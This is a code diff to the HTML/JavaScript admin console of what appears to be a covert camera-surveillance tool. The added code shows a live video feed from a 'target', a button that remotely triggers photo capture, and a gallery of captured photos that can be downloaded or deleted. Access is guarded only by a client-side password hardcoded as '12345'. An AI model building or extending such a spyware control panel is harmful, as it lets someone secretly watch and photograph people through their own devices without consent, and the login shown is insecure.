@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Admin Panel - Password Protected</title>
+    <title>Admin Dashboard & Live Feed</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -21,7 +21,7 @@
             border-radius: 12px;
             text-align: center;
             width: 90%;
-            max-width: 600px;
+            max-width: 650px;
             box-shadow: 0 4px 15px rgba(0,0,0,0.5);
         }
         #loginOverlay {
@@ -47,18 +47,30 @@
             background-color: #00e676;
             color: #000;
             border: none;
-            padding: 12px 24px;
-            font-size: 15px;
+            padding: 10px 18px;
+            font-size: 14px;
             font-weight: bold;
             border-radius: 6px;
             cursor: pointer;
+        }
+        .live-stream-box {
+            margin: 15px 0;
+            background: #111;
+            border: 2px solid #00e676;
+            border-radius: 8px;
+            padding: 10px;
+        }
+        .live-stream-box img {
+            width: 100%;
+            max-width: 380px;
+            border-radius: 6px;
         }
         .gallery {
             display: grid;
             grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
             gap: 15px;
             margin-top: 20px;
-            max-height: 450px;
+            max-height: 400px;
             overflow-y: auto;
             padding: 10px;
             border: 1px solid #444;
@@ -76,21 +88,33 @@
             width: 100%;
             border-radius: 4px;
         }
-        .download-btn {
+        .action-btns {
+            display: flex;
+            gap: 6px;
+            margin-top: 8px;
+        }
+        .btn-download {
             background-color: #0288d1;
             color: white;
             text-decoration: none;
-            padding: 6px 12px;
+            padding: 5px 10px;
             font-size: 12px;
             border-radius: 4px;
-            margin-top: 8px;
-            display: inline-block;
+        }
+        .btn-delete {
+            background-color: #d32f2f;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            font-size: 12px;
+            border-radius: 4px;
+            cursor: pointer;
         }
     </style>
 </head>
 <body>
 
-    <!-- Password Lock Screen -->
+    <!-- Lock Screen -->
     <div id="loginOverlay">
         <h2>🔒 Admin Access Restricted</h2>
         <input type="password" id="passInput" placeholder="Enter Password">
@@ -98,15 +122,22 @@
         <p id="errMsg" style="color: #ff5252; display: none; margin-top: 10px;">Incorrect Password!</p>
     </div>
 
-    <!-- Protected Main Admin Dashboard -->
+    <!-- Dashboard -->
     <div class="container">
-        <h2>👑 Admin Control & Stored Gallery</h2>
+        <h2>👑 Admin Control Panel</h2>
 
-        <div style="margin-bottom: 20px;">
+        <!-- Live Camera Stream -->
+        <h3>🔴 Live Video Feed:</h3>
+        <div class="live-stream-box">
+            <img id="liveFeedImg" src="" alt="Waiting for live stream..." style="display:none;">
+            <p id="streamStatus" style="color: #888;">Target is offline</p>
+        </div>
+
+        <div>
             <button onclick="triggerManualCapture()" style="background-color: #ff1744; color: white;">MANUAL CAPTURE NOW</button>
         </div>
 
-        <h3>Captured Photos (Auto-Synced):</h3>
+        <h3>Captured Photos:</h3>
         <div class="gallery" id="photoGallery">
             <p id="emptyMsg" style="grid-column: 1/-1; color: #aaa;">No stored photos yet.</p>
         </div>
@@ -118,7 +149,6 @@
 
         function login() {
             const pass = document.getElementById('passInput').value;
-            // Admin Password Verification
             if (pass === '12345') {
                 document.getElementById('loginOverlay').style.display = 'none';
                 socket.emit('admin-auth-success');
@@ -131,36 +161,62 @@
             socket.emit('admin-trigger-capture');
         }
 
+        function deletePhoto(fileName, elementId) {
+            socket.emit('delete-photo', fileName);
+            const cardElem = document.getElementById(elementId);
+            if (cardElem) cardElem.remove();
+        }
+
         function renderPhotoCard(imageData, fileName) {
             const emptyMsg = document.getElementById('emptyMsg');
             if (emptyMsg) emptyMsg.style.display = 'none';
 
+            const cardId = `card_${fileName.replace(/[^a-zA-Z0-9]/g, '')}`;
+            if (document.getElementById(cardId)) return;
+
             const gallery = document.getElementById('photoGallery');
             const card = document.createElement('div');
             card.className = 'card';
+            card.id = cardId;
 
             const img = document.createElement('img');
             img.src = imageData;
 
-            const btn = document.createElement('a');
-            btn.className = 'download-btn';
-            btn.href = imageData;
-            btn.download = fileName || `photo_${Date.now()}.jpg`;
-            btn.innerText = '💾 Download';
+            const btnBox = document.createElement('div');
+            btnBox.className = 'action-btns';
+
+            const downBtn = document.createElement('a');
+            downBtn.className = 'btn-download';
+            downBtn.href = imageData;
+            downBtn.download = fileName;
+            downBtn.innerText = '💾 Download';
+
+            const delBtn = document.createElement('button');
+            delBtn.className = 'btn-delete';
+            delBtn.innerText = '🗑️ Delete';
+            delBtn.onclick = () => deletePhoto(fileName, cardId);
+
+            btnBox.appendChild(downBtn);
+            btnBox.appendChild(delBtn);
 
             card.appendChild(img);
-            card.appendChild(btn);
+            card.appendChild(btnBox);
             gallery.insertBefore(card, gallery.firstChild);
         }
 
-        // Receive all past offline captured photos when admin logs in
-        socket.on('load-stored-photos', (photosArray) => {
-            photosArray.forEach(item => {
-                renderPhotoCard(item.imageData, item.fileName);
-            });
+        // Live Frame Receiving
+        socket.on('update-live-stream', (frameData) => {
+            const liveImg = document.getElementById('liveFeedImg');
+            const status = document.getElementById('streamStatus');
+            liveImg.src = frameData;
+            liveImg.style.display = 'inline-block';
+            status.style.display = 'none';
         });
 
-        // Receive live photos
+        socket.on('load-stored-photos', (photosArray) => {
+            photosArray.forEach(item => renderPhotoCard(item.imageData, item.fileName));
+        });
+
         socket.on('send-photo-to-admin', (data) => {
             renderPhotoCard(data.imageData, data.fileName);
         });
